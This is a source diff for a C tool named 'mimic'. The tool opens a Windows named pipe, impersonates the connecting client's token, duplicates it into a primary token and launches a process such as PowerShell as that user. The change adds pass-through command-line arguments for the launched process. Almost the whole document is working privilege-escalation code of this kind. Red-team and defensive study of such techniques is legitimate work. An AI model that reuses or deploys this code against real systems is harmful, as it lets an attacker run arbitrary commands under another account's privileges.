@@ -9,22 +9,47 @@
 
 void printTokenAccountInfo(HANDLE token);
 void printTokenImpersonationLevel(HANDLE token);
-void executeShell(HANDLE token, LPCWSTR processName);
+void executeShell(HANDLE token, LPCWSTR processName, LPWSTR cmd);
 void printLastError(char* str);
 LPWSTR charToLPWSTR(char* charString);
 int checkPrivilege(HANDLE token, LPCTSTR lpszPrivilege);
 void enablePrivilege(HANDLE token, LPCTSTR privilege);
-void impersonateClient(HANDLE hPipe, LPCWSTR processName);
+void impersonateClient(HANDLE hPipe, LPCWSTR processName, LPWSTR cmd);
 HANDLE triggerNamedPipeConnection(LPWSTR pipeName);
 DWORD triggerNamedPipeConnectionThread(LPVOID pipeName);
 
 int main(int argc, char* argv[]) {
 
-    if (argc < 1) {
-        printf("Usage: ./mimic <process>\nExample: ./mimic.exe \\\\.\\pipe\\test C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
+    if (argc < 2) {
+        printf("Usage: ./mimic <process> [arguments] \nExample: ./mimic.exe \\\\.\\pipe\\test C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
         exit(1);
     }
 
+    // Get the command line as a wide string
+    LPWSTR cmdLine = GetCommandLineW();
+
+    // Skip the first argument (the program itself)
+    LPWSTR p = cmdLine;
+    BOOL inQuotes = FALSE;
+
+    // Skip the program name
+    while (*p) {
+        if (*p == L'\"') {
+            inQuotes = !inQuotes;
+        }
+        else if (!inQuotes && *p == L' ') {
+            break;
+        }
+        p++;
+    }
+
+    // Skip spaces after the program name
+    while (*p && *p == L' ') {
+        p++;
+    }
+
+    // Now p points to the first argument after the program name
+    LPWSTR combinedArgs = p;
     LPCWSTR processName = (LPCWSTR)charToLPWSTR(argv[1]);
 
     HANDLE hPipe = INVALID_HANDLE_VALUE;
@@ -103,7 +128,7 @@ int main(int argc, char* argv[]) {
         }
 
         //Impersonate the connected client
-        impersonateClient(hPipe, processName);
+        impersonateClient(hPipe, processName, combinedArgs);
     }
     else {
         free(pipeName);
@@ -196,7 +221,7 @@ void printTokenImpersonationLevel(HANDLE token) {
     free(tokenLevel);
 }
 
-void executeShell(HANDLE token, LPCWSTR processName) {
+void executeShell(HANDLE token, LPCWSTR processName, LPWSTR cmd) {
     //We first need to duplicate the impersonation token to a primary token to execute processes
     HANDLE primaryToken = INVALID_HANDLE_VALUE;
 
@@ -208,7 +233,7 @@ void executeShell(HANDLE token, LPCWSTR processName) {
     PROCESS_INFORMATION pi = { 0 };
 
     //Execute in context of primary token
-    if (CreateProcessAsUserW(primaryToken, processName, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+    if (CreateProcessAsUserW(primaryToken, processName, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
         WaitForSingleObject(pi.hProcess, INFINITE);
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
@@ -336,7 +361,7 @@ void enablePrivilege(HANDLE token, LPCTSTR lpszPrivilege) {
 }
 
 
-void impersonateClient(HANDLE hPipe, LPCWSTR processName) {
+void impersonateClient(HANDLE hPipe, LPCWSTR processName, LPWSTR cmd) {
     HANDLE token = INVALID_HANDLE_VALUE;
 
     //Impersonation Fails if We do not read data from the pipe beforehand.
@@ -357,7 +382,7 @@ void impersonateClient(HANDLE hPipe, LPCWSTR processName) {
         if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &token)) {
             printTokenAccountInfo(token);
             printTokenImpersonationLevel(token);
-            executeShell(token, processName);
+            executeShell(token, processName, cmd);
             CloseHandle(token);
         }
         else {
